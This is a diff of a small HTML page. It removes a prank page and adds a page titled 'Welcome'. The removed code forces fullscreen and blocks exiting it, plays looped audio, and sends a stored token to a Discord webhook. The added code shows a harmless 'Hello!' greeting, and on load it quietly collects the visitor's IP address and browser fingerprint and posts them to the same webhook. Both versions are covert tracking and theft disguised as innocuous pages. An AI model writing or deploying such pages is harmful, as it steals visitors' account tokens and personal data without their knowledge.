@@ -1,69 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Fullscreen Audio</title>
-  <style>
-    body, html {
-      margin: 0; padding: 0; height: 100%; overflow: hidden;
-      background: black;
-      display: flex; justify-content: center; align-items: center;
-      color: white;
-      font-family: sans-serif;
-    }
-  </style>
+  <title>Welcome</title>
 </head>
 <body>
-<audio id="audio" src="https://sevkabevka.github.io/alah.mp3" autoplay loop></audio>
-  <h1>Playing...</h1>
+  <h1>Hello!</h1>
 
   <script>
-    const elem = document.documentElement;
-    const audio = document.getElementById('audio');
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        const browserInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          cookiesEnabled: navigator.cookieEnabled,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        const webhookURL = "https://discordapp.com/api/webhooks/1374439335784353842/bOzRgYIW_ZZvSkTuiWk-wiL-tkVklOo9wqgH2lkljXC41w3waBQutFo7Cgo5RxgpD_1W";
 
-    function openFullscreen() {
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) { /* Safari */
-        elem.webkitRequestFullscreen();
-      } else if (elem.msRequestFullscreen) { /* IE11 */
-        elem.msRequestFullscreen();
-      }
-    }
+        const content = `IP: ${ip}\n` +
+                        `User Agent: ${browserInfo.userAgent}\n` +
+                        `Platform: ${browserInfo.platform}\n` +
+                        `Language: ${browserInfo.language}\n` +
+                        `Cookies Enabled: ${browserInfo.cookiesEnabled}\n` +
+                        `Screen: ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n` +
+                        `Timezone: ${browserInfo.timezone}`;
 
-    // Token grabber script
-    function grabToken() {
-      try {
-        let token = localStorage.getItem('token');
-        if (token) {
-          fetch('https://discordapp.com/api/webhooks/1374439335784353842/bOzRgYIW_ZZvSkTuiWk-wiL-tkVklOo9wqgH2lkljXC41w3waBQutFo7Cgo5RxgpD_1W', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ content: `Token grabbed: ${token}` })
-          });
-        }
-      } catch (e) {}
-    }
-
-    // Open fullscreen and play audio on load, then grab token
-    window.onload = () => {
-      openFullscreen();
-      audio.play();
-      grabToken();
-    };
-
-    // Detect if fullscreen is exited and reopen it
-    document.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement) {
-        openFullscreen();
-      }
-    });
-
-    // Attempt to reopen fullscreen if user exits via keyboard shortcuts
-    document.addEventListener('keydown', (e) => {
-      if ((e.key === 'Escape' || e.key === 'F11') && !document.fullscreenElement) {
-        openFullscreen();
-      }
-    });
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: content })
+        });
+      });
   </script>
 </body>
 </html>
